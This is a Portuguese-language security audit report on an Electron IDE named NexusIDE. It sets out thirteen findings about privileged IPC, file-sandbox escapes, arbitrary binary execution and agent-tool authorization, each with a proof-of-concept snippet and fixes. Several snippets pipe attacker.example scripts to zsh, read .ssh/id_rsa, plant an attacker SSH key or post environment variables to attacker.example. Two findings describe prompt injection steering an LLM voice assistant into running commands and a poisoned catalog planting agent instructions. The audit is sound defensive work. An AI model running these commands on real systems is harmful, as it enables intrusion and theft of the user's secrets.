# Auditoria SÊNIOR de Segurança - NexusIDE

Missão: `mission-mr7vgjyz-1`  
Escopo: Electron + TypeScript + React  
Modo: auditoria estática, somente leitura do repositório durante a análise. Nenhum arquivo do projeto foi editado, nenhum processo foi morto, `codex exec` não foi executado e não houve sub-revisões.

## Resumo Executivo

O NexusIDE possui bons controles de base no Electron: `contextIsolation`, `sandbox`, `nodeIntegration: false`, CSP em produção, bloqueio de navegação externa e Electron fuses relevantes. A store de segredos também evita fallback plaintext e grava o vault com permissões restritas.

O risco principal está na fronteira `renderer -> preload -> main`. O renderer recebe APIs de alto privilégio: PTY/shell, escrita em terminal, leitura/escrita de arquivos, configuração de binários de providers e ferramentas de orquestração. Assim, uma XSS ou comprometimento do renderer pode virar execução local de comandos, leitura/escrita de arquivos do usuário e controle de panes/agentes.

Prioridade recomendada:

1. Reduzir e autorizar explicitamente a superfície PTY exposta ao renderer.
2. Corrigir sandbox de arquivos: sem fallback para home e sem escape por symlink.
3. Proteger `binPath`/`extraArgs` de providers contra execução arbitrária.
4. Implementar autorização por missão/sessão/role nas ferramentas MCP de panes.
5. Adicionar confirmação obrigatória para comandos vindos de voice/Jarvis.

## Controles Positivos Observados

- Electron hardening em `src/main/window.ts:76`: `contextIsolation: true`, `nodeIntegration: false`, `sandbox: true`, `webviewTag: false`.
- CSP configurada em `src/main/window.ts:10`, com produção restritiva e relaxamento de desenvolvimento limitado ao Vite/HMR.
- Bloqueio de `window.open` e navegação externa em `src/main/window.ts:85`.
- Electron fuses em `forge.config.ts:86`: `RunAsNode` desabilitado, `NODE_OPTIONS`/inspect desabilitados, ASAR integrity e carregamento apenas via ASAR.
- Preload usa `contextBridge.exposeInMainWorld` e não expõe `ipcRenderer` cru em `src/preload/preload.ts:359`.
- Muitos IPC payloads usam schemas Zod.
- Não foi encontrado uso direto de `shell: true` nos spawns revisados; chamadas principais usam arrays de argumentos.
- `src/main/persistence/secrets-store.ts` usa `safeStorage`, recusa fallback plaintext e grava `secrets.enc` com modo `0600`.

## Achados

### 1. Alto - Renderer comprometido consegue execução local via PTY exposto

**Arquivo:linha**

- `src/preload/preload.ts:191`
- `src/main/pty/pty-ipc.ts:29`
- `src/main/pty/pty-manager.ts:262`
- `src/main/pty/pty-manager.ts:411`
- `src/shared/ipc.ts:46`

**Descrição**

O preload expõe `window.nexus.pty.spawn`, `window.nexus.pty.write` e `window.nexus.pty.kill` diretamente ao renderer. O handler principal aceita `PTY_CHANNELS.spawn`, valida apenas o formato do payload e, para `kind: 'shell'`, cria um shell com `nodePty.spawn(shell, [], ...)`. Em seguida, `writeSession` permite enviar strings arbitrárias ao PTY, com limite alto de payload.

Esse desenho faz com que qualquer XSS ou comprometimento do renderer escale para execução local de comandos no contexto do usuário.

**Exploit concreto**

Um script injetado no renderer pode executar:

```js
const result = await window.nexus.pty.spawn({
  kind: 'shell',
  cols: 80,
  rows: 24,
  cwd: '/Users/cleofaspereirarocha'
});

window.nexus.pty.write(
  result.sessionId,
  'curl https://attacker.example/payload.sh | zsh\n'
);
```

Isso transforma uma falha de renderer em RCE local.

**Fix**

- Tratar PTY como API privilegiada, não como utilitário disponível globalmente ao renderer.
- Exigir gesto explícito do usuário/capability por pane antes de criar shell ou escrever nele.
- Vincular cada sessão PTY a um pane/UI owner criado por fluxo confiável.
- Não permitir `write` arbitrário em sessões que não pertençam ao componente renderer autorizado.
- Considerar broker no main que só aceite ações semânticas aprovadas, não bytes arbitrários para terminal.
- Documentar formalmente o threat model se a decisão for aceitar que renderer comprometido equivale a execução local.

### 2. Alto - IPC de arquivos usa home como raiz quando não há workspace ativo

**Arquivo:linha**

- `src/main/persistence/workspace-store.ts:74`
- `src/main/files-ipc.ts:36`
- `src/main/files-ipc.ts:87`
- `src/preload/preload.ts:301`

**Descrição**

`activeWorkspacePath()` retorna `state.current?.path ?? os.homedir()`. O IPC de arquivos usa essa raiz para `safeResolve`. Portanto, quando não há workspace ativo, a sandbox de arquivos passa a ser o diretório home do usuário.

O preload expõe `window.nexus.files.read` e `window.nexus.files.write`, permitindo que um renderer comprometido leia e escreva arquivos relativos ao home.

**Exploit concreto**

Com nenhum workspace ativo, ou após uma transição que deixe `state.current` vazio, um renderer comprometido pode executar:

```js
await window.nexus.files.read('.ssh/id_rsa');
await window.nexus.files.write('.zshrc', 'curl https://attacker.example/s | zsh\n');
```

Mesmo com limite de leitura, muitos arquivos sensíveis de home cabem no limite.

**Fix**

- `activeWorkspacePath()` deve retornar `null`/erro quando não houver workspace ativo.
- O IPC de arquivos deve falhar fechado sem workspace.
- Nunca usar `os.homedir()` como fallback implícito de sandbox.
- Se home for um workspace válido, exigir seleção explícita pelo usuário e persistir essa escolha como workspace ativo.

### 3. Alto - Escape por symlink em escrita de arquivo novo

**Arquivo:linha**

- `src/main/files-ipc.ts:37`
- `src/main/files-ipc.ts:41`
- `src/main/files-ipc.ts:46`
- `src/main/files-ipc.ts:87`

**Descrição**

`safeResolve` faz checagem lexical com `path.relative(root, abs)` e tenta `realpathSync(abs)`. Se o alvo ainda não existe, `realpathSync(abs)` falha e o código aceita o caminho com base apenas na checagem lexical.

Isso não detecta symlinks em diretórios pais. Se um diretório dentro do workspace for symlink para fora, escrever um arquivo novo sob esse diretório escapa da sandbox.

**Exploit concreto**

Suponha que o workspace contenha:

```text
out -> /Users/cleofaspereirarocha/.ssh
```

O renderer chama:

```js
await window.nexus.files.write('out/authorized_keys', 'ssh-rsa AAAA... attacker\n');
```

Como `out/authorized_keys` ainda não existe, a checagem de `realpath` do alvo falha e a escrita segue o symlink do diretório pai, criando ou alterando arquivo fora do workspace.

**Fix**

- Resolver `realpath` da raiz do workspace e do diretório pai mais próximo existente antes de escrever.
- Rejeitar qualquer pai cujo `realpath` esteja fora do workspace real.
- Rejeitar symlinks intermediários por padrão ou exigir opt-in explícito.
- Usar flags como `O_NOFOLLOW` para o componente final quando disponível.

### 4. Alto - Renderer pode configurar binário arbitrário para execução de CLI agents

**Arquivo:linha**

- `src/shared/provider-settings-types.ts:11`
- `src/main/persistence/provider-config-store.ts:332`
- `src/main/pty/pty-manager.ts:318`
- `src/main/pty/pty-manager.ts:361`
- `src/main/pty/pty-ipc.ts:57`

**Descrição**

O schema de configuração de providers aceita `binPath` e `extraArgs` vindos do renderer. O main persiste esses valores e, ao iniciar um CLI agent, usa `overrides.binPath || argv[0]` como binário para `nodePty.spawn`. O próprio IPC reconhece que um binário configurado pelo usuário ignora a checagem de instalação via PATH.

Na prática, qualquer renderer comprometido pode escolher um executável local arbitrário para o main executar.

**Exploit concreto**

```js
await window.nexus.providers.setConfig({
  adapterId: 'claude',
  binPath: '/tmp/nexus-payload',
  extraArgs: []
});

await window.nexus.pty.spawn({
  kind: 'cli-agent',
  adapterId: 'claude',
  cols: 100,
  rows: 30,
  cwd: '/Users/cleofaspereirarocha/nexus-ide'
});
```

O processo principal executa `/tmp/nexus-payload` no contexto do usuário.

**Fix**

- Exigir confirmação explícita do usuário para qualquer novo `binPath` ou alteração de path.
- Validar que `binPath` é absoluto, executável e esperado para o provider.
- Persistir confiança por `path + hash` do binário, não apenas por path textual.
- Exibir o path efetivo no UI antes da execução.
- Validar `extraArgs` contra allowlist por adapter ou exigir confirmação para argumentos perigosos.
- Não permitir que um renderer genérico altere o executável usado por um processo privilegiado sem fluxo confiável.

### 5. Alto - Ferramentas MCP de panes não têm autorização por missão/sessão/role

**Arquivo:linha**

- `src/main/orch/tools-panes.ts:106`
- `src/main/orch/tools-panes.ts:128`
- `src/main/orch/tools-panes.ts:164`
- `src/main/orch/tool-util.ts:55`
- `src/main/orch/mcp-protocol.ts:134`
- `src/main/orch/gate.ts:51`
- `src/main/orch/builtin-squads.ts:31`

**Descrição**

Ferramentas como `nexus_pane_read`, `nexus_pane_write`, `nexus_pane_close`, `pane_read_many` e `pane_write_many` recebem um `paneId`/`sessionId` e operam sobre a sessão encontrada. `sessionIdOf` apenas localiza o pane e retorna a sessão, sem validar missão, owner, papel ou escopo.

O gate valida principalmente se o nome da ferramenta está permitido. Quando `allowedTools` é `null`, o comportamento é irrestrito. Alguns squads built-in não definem allowlist explícita.

**Exploit concreto**

Um agente com acesso a ferramentas de pane pode:

1. Chamar `nexus_pane_list` para descobrir panes ativos.
2. Chamar `nexus_pane_read` contra um terminal de outro agente ou do usuário e capturar segredos impressos.
3. Chamar `nexus_pane_write` contra um shell ou CLI agent alheio e injetar comandos.

Isso permite escape lateral entre missões/panes.

**Fix**

- Implementar autorização por objeto: `missionId`, owner, role e tipo de pane.
- Workers devem operar apenas em panes da própria missão e, idealmente, apenas nos panes que criaram.
- Proibir escrita em shell panes por workers, salvo permissão explícita.
- Separar ferramentas amplas em capacidades menores: `pane_read_own`, `pane_write_worker`, `orchestrator_handoff`.
- Definir `allowedTools` explícito e mínimo para todos os squads built-in.
- Auditar/logar leituras e escritas cross-pane.

### 6. Médio - Jarvis/voice pode executar comando decidido por LLM sem confirmação

**Arquivo:linha**

- `src/main/voice/jarvis-brain.ts:38`
- `src/main/voice/jarvis-brain.ts:56`
- `src/main/voice/jarvis-brain.ts:125`
- `src/renderer/voice/voice-controller.ts:427`
- `src/renderer/terminal/terminal-host.ts:501`

**Descrição**

O prompt de sistema do Jarvis instrui o modelo a usar `run_command` para executar ações. O parser aceita uma ação `{ type: 'run_command', command: string }`. No renderer, essa ação é escrita diretamente no pane focado com newline.

Não foi observada confirmação obrigatória, checagem de pane shell, allowlist de comandos ou bloqueio robusto para comandos perigosos.

**Exploit concreto**

Uma transcrição maliciosa ou prompt injection no contexto pode induzir o modelo a retornar:

```json
{"type":"run_command","command":"curl https://attacker.example/p.sh | zsh"}
```

O renderer escreve o comando no terminal focado e o executa.

**Fix**

- Exigir confirmação explícita do usuário antes de executar qualquer `run_command`.
- Mostrar o comando exato que será enviado.
- Restringir execução a panes shell explícitos.
- Implementar allowlist para comandos de baixo risco ou bloqueio padrão de padrões perigosos.
- Separar “sugerir comando” de “executar comando”.

### 7. Médio - Voice IPC atua como confused deputy para chaves e quota do main

**Arquivo:linha**

- `src/main/voice/voice-ipc.ts:153`
- `src/main/voice/jarvis-brain.ts:188`
- `src/main/voice/tts-service.ts:64`
- `src/main/voice/stt-service.ts:95`
- `src/shared/voice-ipc.ts:12`
- `src/shared/voice-ipc.ts:25`
- `src/shared/voice-ipc.ts:168`

**Descrição**

Handlers de voice recebem texto, áudio e contexto do renderer e o main resolve as chaves de OpenAI/Groq. O renderer não lê diretamente a chave, mas pode acionar chamadas autenticadas com conteúdo controlado.

Os limites são altos o suficiente para abuso de quota e, combinado com outros achados, exfiltração de dados locais via chamadas cloud.

**Exploit concreto**

Um renderer comprometido pode ler dados locais via `files.read` e enviar o conteúdo para o provedor de LLM/STT/TTS usando os handlers de voice, fazendo o main assinar a requisição com a chave armazenada.

**Fix**

- Rate limit por janela e por tipo de chamada.
- Exigir estado ativo da UI/captura para aceitar transcrição/síntese/Jarvis.
- Impor limites menores e telemetria local visível para chamadas cloud.
- Separar fluxos que enviam conteúdo arbitrário à nuvem de ações locais.
- Adicionar confirmação/indicador quando dados de workspace forem enviados ao provedor.

### 8. Médio - Remote debugging em desenvolvimento abre controle total do renderer para processo local

**Arquivo:linha**

- `src/main/main.ts:6`

**Descrição**

Em modo não empacotado, o app habilita `remote-debugging-port` na porta `9223`. Qualquer processo local que consiga conectar ao Chrome DevTools Protocol pode executar JavaScript no renderer.

Com as APIs expostas no preload, isso vira leitura/escrita de arquivos e execução de comandos via PTY.

**Exploit concreto**

Um processo local conecta em `localhost:9223`, avalia JS no renderer e executa:

```js
const s = await window.nexus.pty.spawn({kind:'shell', cols:80, rows:24});
window.nexus.pty.write(s.sessionId, 'env | curl -X POST --data-binary @- https://attacker.example/env\n');
```

**Fix**

- Tornar remote debugging opt-in por variável de ambiente específica.
- Usar porta aleatória quando necessário.
- Emitir aviso claro no UI/log.
- Bloquear ou alertar quando segredos/workspaces reais estiverem carregados.

### 9. Médio - Entitlements macOS enfraquecem proteções de hardened runtime

**Arquivo:linha**

- `build/entitlements.mac.plist:13`
- `build/entitlements.mac.plist:27`

**Descrição**

O app habilita entitlements como `allow-jit`, `allow-unsigned-executable-memory`, `allow-dyld-environment-variables`, `disable-library-validation` e `disable-executable-page-protection`. Alguns podem ser necessários para Electron/native modules, mas o conjunto é amplo.

Isso amplia a superfície para abuso de carregamento de código em cenários com ambiente local malicioso, child processes comprometidos ou distribuição assinada.

**Exploit concreto**

Um launcher local malicioso ou processo filho controlado pode tentar abusar de variáveis `DYLD_*` e relaxamentos de library validation/executable page protection para influenciar carregamento de código nativo no processo assinado, dependendo do contexto de execução e assinatura.

**Fix**

- Remover `allow-dyld-environment-variables` salvo necessidade comprovada.
- Remover `disable-executable-page-protection` salvo necessidade comprovada.
- Manter `disable-library-validation` apenas se indispensável e documentado.
- Limpar `DYLD_`/`LD_` de todos os ambientes de child process, incluindo env base, não só envs declarados por plugins.
- Revisar entitlements separadamente para dev e produção.

### 10. Médio - Resolução via PATH confia em diretórios graváveis pelo usuário

**Arquivo:linha**

- `src/main/path-resolver.ts:47`
- `src/main/path-resolver.ts:81`
- `src/main/adapters/adapter-registry.ts:72`
- `src/main/pty/pty-manager.ts:311`
- `src/main/pty/pty-manager.ts:361`

**Descrição**

O app resolve PATH a partir do shell de login do usuário e inclui diretórios comuns do usuário. A checagem de instalação usa `which`, e a execução padrão usa o nome do binário do adapter quando não há override.

Se um diretório user-writable vier antes no PATH, um binário falso com nome de provider pode ser executado e receber envs/capacidades do app.

**Exploit concreto**

Um atacante que consiga escrever em um diretório anterior no PATH cria um executável `claude` ou `codex`. O NexusIDE detecta o binário como instalado e, ao iniciar o adapter, executa o payload.

**Fix**

- Resolver e persistir path absoluto efetivo do adapter.
- Exibir o path ao usuário e exigir trust explícito para paths em diretórios user-writable.
- Preferir locais de instalação conhecidos quando possível.
- Alertar quando o binário estiver em diretório gravável pelo usuário ou por grupo/outros.
- Opcionalmente validar assinatura/hash do binário confiado.

### 11. Médio - Catálogo remoto instala conteúdo não pinado em `~/.claude`

**Arquivo:linha**

- `src/main/catalog/catalog.ts:20`
- `src/main/catalog/catalog.ts:160`
- `src/main/catalog/catalog.ts:187`
- `src/main/catalog/catalog.ts:247`
- `src/main/orch/tools-domain.ts:303`

**Descrição**

O catálogo busca conteúdo de `davila7/claude-code-templates` em branch mutável e instala agents/skills em `~/.claude/agents` e `~/.claude/skills`. Há checagem contra traversal no slug, mas o conteúdo remoto em si não é pinado por commit nem verificado por checksum/assinatura.

Como há ferramenta MCP para instalação de catálogo, um agente com permissão pode instalar conteúdo que afeta comportamento futuro da CLI.

**Exploit concreto**

Se o upstream for comprometido ou alterado maliciosamente, um agente com `nexus_catalog_install` instala instruções/skills alterados. Em execuções futuras, a CLI pode seguir instruções maliciosas persistidas em `~/.claude`.

**Fix**

- Pin por commit ou release verificada.
- Validar checksum/assinatura do conteúdo instalado.
- Mostrar diff ao usuário e exigir aprovação para instalação.
- Restringir `catalog_install` a papel confiável, não workers genéricos.
- Registrar origem, commit e hash do conteúdo instalado.

### 12. Baixo - Arquivos de configuração operacionalmente sensíveis sem modo `0600` explícito

**Arquivo:linha**

- `src/main/persistence/provider-config-store.ts:93`
- `src/main/persistence/workspace-store.ts:55`
- `src/main/persistence/settings-store.ts:41`

**Descrição**

Alguns stores gravam JSONs em `~/.nexus` sem modo de arquivo explícito. Eles não são o vault de segredos, mas podem conter paths de workspace, `binPath`, `extraArgs`, upstreams e preferências relevantes para segurança.

Dependendo do `umask` e permissões do diretório, outro usuário local pode ler metadados sensíveis.

**Exploit concreto**

Em uma máquina multiusuário com permissões permissivas, outro usuário local lê `~/.nexus/providers.json` e descobre paths de binários customizados, argumentos operacionais e nomes de projetos/workspaces.

**Fix**

- Criar `~/.nexus` com modo `0700`.
- Gravar configs com modo `0600`.
- Reaplicar permissões em migração para arquivos existentes.
- Manter segredos exclusivamente no vault criptografado.

### 13. Baixo - CSP pode receber diretivas adicionais de hardening

**Arquivo:linha**

- `src/main/window.ts:40`

**Descrição**

A CSP de produção já é razoavelmente restritiva, mas não inclui Trusted Types nem algumas diretivas adicionais como `form-action 'none'` e `frame-ancestors 'none'`. Não foi observado exploit direto nesta auditoria, mas essas diretivas reduzem impacto de futuras introduções de sinks DOM perigosos.

**Exploit concreto**

Se no futuro for introduzido um sink DOM com HTML controlável, a ausência de Trusted Types remove uma camada de mitigação contra XSS baseada em DOM.

**Fix**

- Testar `require-trusted-types-for 'script'` em modo report-only.
- Definir policy Trusted Types compatível com React/Vite se necessário.
- Adicionar `form-action 'none'`.
- Adicionar `frame-ancestors 'none'` quando aplicável ao contexto Electron.
- Manter relaxamentos de dev estritamente fora de produção.

## Observações por Escopo

### Electron hardening

A base está boa: isolamento de contexto, sandbox, node integration desabilitado, bloqueio de navegação e CSP. O problema não é a ausência desses flags; é que o preload disponibiliza ao renderer capacidades equivalentes a filesystem, terminal e execução de processos.

### IPC e preload

A validação de formato via Zod ajuda, mas não substitui autorização. Os IPCs mais sensíveis precisam checar intenção, owner, missão, tipo de pane e estado da UI, não apenas shape do payload.

### child_process e CLIs externas

Não foi encontrado `shell:true` nos pontos revisados. O risco principal está em `PATH`, `binPath` configurável e execução de binário arbitrário via provider override.

### Allowlists do squad

O modelo atual permite bypass por allowlist nula e não aplica autorização por objeto/pane. Permissão por nome de ferramenta é insuficiente para ferramentas que aceitam IDs globais.

### Segredos

O vault principal está bem encaminhado com `safeStorage` e `0600`. O risco é uso indireto das chaves por IPC privilegiado e exposição de metadados/configs sem permissões explícitas.

### Rede e portas

O ponto relevante é o remote debugging em dev na porta `9223`. Serviços voice/LLM também devem ser tratados como canais de exfiltração quando acionados pelo renderer.

## Conclusão

O NexusIDE tem bons controles estruturais de Electron, mas a superfície privilegiada exposta ao renderer reduz a efetividade desses controles. A correção mais importante é redesenhar as APIs de preload/IPC para operarem com capabilities estreitas, autorização por objeto e confirmação explícita para ações destrutivas ou que executem código.

